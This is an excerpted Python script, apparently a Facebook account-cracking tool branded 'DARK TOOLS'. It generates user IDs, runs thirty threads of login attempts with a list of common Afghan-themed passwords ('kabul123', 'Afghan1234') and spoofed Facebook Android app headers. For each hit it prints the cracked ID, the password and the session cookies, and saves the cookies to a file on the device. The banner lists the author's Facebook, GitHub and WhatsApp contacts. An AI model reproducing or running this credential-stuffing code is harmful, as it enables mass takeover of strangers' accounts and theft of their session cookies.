...
os.system('xdg-open https://facebook.com/groups/820349938741498//')
...
=======================================================
\033[1;31m====================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{DARK}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{JANAN AMIR}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{DARK001}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93777486381 }\33[0;m
...
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO DARK TOOLS\33[0;m
...
def FKING():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('xdg-open https://chat.whatsapp.com/LXCJftKGwIY1q3P3Z8TFg3')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','600700','10002000','50006000','kabul123','Afghan1234','kabul1234','afghanistan','Afghanistan','400500','afghan123']
...
DARK = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
DARK = random.choice(DARK)
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [DARK➥]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(DARK)
                        Fjjj=random.choice(DARK)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        ua = 'Dalvik/2.0.0 (Linux; U; Android 11; Google Pixel 5 Build/RQ2A.210505.003) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Google;FBMF/Pixel 5;FBBD/Pixel 5;FBPN/com.facebook.katana;FBDV/Pixel 5;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
                        ...
                        'accept-language': 'en-AU,en;q=0.9,fa-IR;q=0.8,fa;q=0.7,en-GB;q=0.6,en-US;q=0.5',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [DARK==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/DARK-COOKIE.txt','a').write(coki+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [DARK==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
